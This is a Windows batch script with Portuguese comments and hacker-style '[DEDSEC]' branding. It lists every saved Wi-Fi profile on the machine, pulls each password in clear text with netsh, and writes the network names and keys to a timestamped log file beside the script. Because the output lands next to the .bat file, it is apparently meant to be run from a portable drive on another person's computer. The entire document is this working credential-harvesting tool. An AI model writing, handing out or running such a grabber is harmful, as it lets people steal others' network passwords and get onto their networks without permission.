@echo off
title [DEDSEC] Extração de Senhas Wi-Fi Salvas
color 0a
echo [DEDSEC] Extraindo senhas de redes Wi-Fi salvas...
setlocal enabledelayedexpansion

REM Definir o caminho da pasta atual (onde o arquivo .bat está)
set local_folder=%~dp0

REM Gerar a data e hora atual para um nome de arquivo único
set data=%date:~-4,4%-%date:~-7,2%
set hora=%time:~0,2%-%time:~3,2%-%time:~6,2%
set hora=%hora: =0%

REM Definir o arquivo de log para salvar as informações
set logFile=%local_folder%wifi_password_log_%data%_%hora%.txt

REM Listar todas as redes Wi-Fi conhecidas e suas senhas
echo ============================== >> %logFile%
echo Redes Wi-Fi Conhecidas e Senhas >> %logFile%
echo ============================== >> %logFile%

REM Obter todos os perfis Wi-Fi
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr /R /C:"Profile Name"') do (
    set "profile=%%A"
    set "profile=!profile:~1!"
    echo Nome da rede: !profile! >> %logFile%
    
    REM Obter a senha do perfil
    for /f "tokens=2 delims=:" %%B in ('netsh wlan show profile name="!profile!" key=clear ^| findstr /R /C:"Key Content"') do (
        set "key=%%B"
        set "key=!key:~1!"
        echo Senha: !key! >> %logFile%
    )
    
    REM Se a senha não for encontrada, registrar mensagem
    if not defined key (
        echo Senha: Não encontrada >> %logFile%
    )
    echo. >> %logFile%
    set "key="
)

echo [DEDSEC] Extração de senhas Wi-Fi concluída. Informações salvas em %logFile%.
pause
exit
